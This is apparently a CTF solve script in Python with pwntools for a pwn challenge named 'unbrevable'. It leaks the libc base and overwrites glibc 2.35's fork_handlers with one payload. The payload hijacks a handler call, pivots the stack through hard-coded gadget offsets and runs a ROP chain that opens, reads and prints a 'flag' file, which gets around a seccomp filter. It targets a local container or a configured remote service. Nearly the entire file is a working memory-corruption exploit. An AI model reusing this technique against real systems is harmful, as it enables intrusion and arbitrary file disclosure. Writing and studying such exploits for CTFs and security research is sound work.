#!/usr/bin/env ctf-python
"""
unbrevable. One arbitrary write into glibc's fork_handlers, which runs before
clone and so before seccomp kills us.
    CTF_LOCAL=1 ctf-python solve/solve.py                  local container
    ctf-python solve/solve.py                              target in meta.json
    CTF_TARGET='nc host 1337' ctf-python solve/solve.py
fgets stops at 0x0a, so ~11% of ASLR bases give an unusable payload. Rerolls.
"""

import os
import pathlib
import subprocess
import sys
import time
import zipfile

_here = pathlib.Path(__file__).resolve()
for _p in _here.parents:
    if (_p / "lib" / "ctf.py").is_file():
        sys.path.insert(0, str(_p / "lib"))
        break

import ctf  # noqa: E402
from pwn import ELF, log, p64, remote  # noqa: E402

CHAL = ctf.challenge_dir()
ZIP = ctf.handout("unbrevable.zip")

LOCAL_PORT = int(os.environ.get("CTF_LOCAL_PORT", "31337"))
LOCAL_IMAGE = "unbrevable-local"

# libc 2.35-0ubuntu3.8, md5 35c2a88035b3f6dc5580d8f55d6384e1
FORK_HANDLERS = 0x221AE0
G_MAGIC = 0x167420  # mov rdx,[rdi+8] ; mov [rsp],rax ; call [rdx+0x20]
G_PIVOT = 0x05A120  # mov rsp,rdx ; ret
G_ADD28 = 0x045F25  # add rsp,0x28 ; ret
G_ADD8 = 0x02A527  # add rsp,8 ; ret
G_RDI = 0x02A3E5  # pop rdi ; ret
G_RSI = 0x02BE51  # pop rsi ; ret
G_RDXRBX = 0x0904A9  # pop rdx ; pop rbx ; ret
G_RDIRAX = 0x090088  # mov rdi,rax ; call [rbx+0x360]

M = (1 << 64) - 1


def unpack():
    """Unpack the handout into scratch/. handout/ stays byte for byte intact."""
    out = CHAL / "scratch"
    out.mkdir(exist_ok=True)
    if not (out / "libc.so.6").is_file() and ZIP.is_file():
        with zipfile.ZipFile(ZIP) as z:
            for n in z.namelist():
                z.extract(n, out)
        for p in out.rglob("libc.so.6"):
            for f in p.parent.iterdir():
                if f.parent != out:
                    f.rename(out / f.name)
            break
    return out


def build_payload(base, libc):
    """The whole exploit: one contiguous blob written at libc+0x221ae0."""
    s = libc.symbols
    B = base + FORK_HANDLERS
    A = B + 0x20  # rdi at the hijacked call
    H = B + 0x30  # slot the handler pointer is read from
    F = B + 0x100  # rsp after the pivot
    NAME = B + 0x38
    BUF = B + 0x400

    buf = bytearray(b"A" * 0x400)

    def put(off, val):
        buf[off : off + 8] = p64(val & M)

    put(0x00, A)  # fork_handlers.used  -> rdi
    put(0x08, 0x4141414141414141)  # .allocated, unread
    put(0x10, (H - ((A - 1) << 5)) & M)  # .array, so array+(used-1)*32 == H
    put(0x28, F)  # [rdi+8] -> rdx
    put(0x30, base + G_MAGIC)  # the handler that gets called
    buf[0x38:0x40] = b"flag\0\0\0\0"
    put(0x100, base + G_ADD28)  # F+0x00
    put(0x120, base + G_PIVOT)  # F+0x20, target of call [rdx+0x20]
    put(0x360, base + G_ADD8)  # [rbx+0x360] for the mov rdi,rax gadget

    chain = [
        base + G_RDXRBX, 0, B,                      # rbx = B
        base + G_RDI, NAME,
        base + G_RSI, 0,
        base + s["open"],                           # open("flag", O_RDONLY)
        base + G_RDIRAX,                            # rdi = fd
        base + G_RSI, BUF,
        base + G_RDXRBX, 0x100, B,
        base + s["read"],                           # read(fd, BUF, 0x100)
        base + G_RDI, 1,
        base + G_RSI, BUF,
        base + G_RDXRBX, 0x100, B,
        base + s["write"],                          # write(1, BUF, 0x100)
        base + G_RDI, 0,
        base + s["_exit"],
    ]
    buf[0x130 : 0x130 + 8 * len(chain)] = b"".join(p64(x & M) for x in chain)
    return B, bytes(buf)


def start_local(scratch):
    """Stand the service up in a container. The handout binary never runs on the host."""
    if not (scratch / "flag").is_file():
        (scratch / "flag").write_text("TFCCTF{local_fake_flag_for_testing}\n")
    have = subprocess.run(
        ["docker", "image", "inspect", LOCAL_IMAGE],
        capture_output=True,
    )
    if have.returncode != 0:
        log.info("building %s from the handout Dockerfile", LOCAL_IMAGE)
        subprocess.run(
            ["docker", "build", "-q", "-t", LOCAL_IMAGE, "."],
            cwd=scratch, check=True, capture_output=True,
        )
    up = subprocess.run(
        ["docker", "ps", "-q", "--filter", f"name=^{LOCAL_IMAGE}$"],
        capture_output=True, text=True,
    )
    if not up.stdout.strip():
        subprocess.run(["docker", "rm", "-f", LOCAL_IMAGE], capture_output=True)
        subprocess.run(
            ["docker", "run", "-d", "--name", LOCAL_IMAGE, "--memory", "128m",
             "--pids-limit", "128", "-p", f"127.0.0.1:{LOCAL_PORT}:1337", LOCAL_IMAGE],
            check=True, capture_output=True,
        )
        time.sleep(2)
    return "127.0.0.1", LOCAL_PORT


def connect(scratch):
    if os.environ.get("CTF_LOCAL"):
        host, port = start_local(scratch)
        return remote(host, port)
    t = ctf.target()
    if t.get("kind") != "tcp":
        raise RuntimeError(f"no tcp target (got {t!r}); set CTF_TARGET or run ctf instance start")
    return remote(t["host"], t["port"], ssl=t.get("ssl", False))


def attempt(io, libc):
    base = int(io.recvline().strip(), 16) - libc.symbols["setvbuf"]
    if base & 0xFFF:
        raise RuntimeError(f"leak not page aligned: {base:#x}")
    B, payload = build_payload(base, libc)
    if b"\n" in payload:
        return None  # fgets would truncate, reroll ASLR
    io.sendline(b"%d %d" % (B, 0x2000))
    io.send(payload + b"\n")
    return io.recvall(timeout=6)


def main():
    scratch = unpack()
    libc = ELF(str(scratch / "libc.so.6"), checksec=False)
    for i in range(30):
        io = connect(scratch)
        try:
            out = attempt(io, libc)
        finally:
            io.close()
        if out is None:
            log.info("attempt %d: 0x0a in payload, rerolling", i)
            continue
        flag = ctf.find_flag(out)
        if flag:
            print(f"\n[+] FLAG: {flag}")
            # A local run reads the placeholder flag out of the test container.
            # Recording that would poison the submission queue, so don't.
            if not os.environ.get("CTF_LOCAL"):
                ctf.record(flag)
            return 0
        log.info("attempt %d: no flag, got %r", i, out[:64])
    log.failure("no flag after 30 attempts")
    return 1


if __name__ == "__main__":
    sys.exit(main())
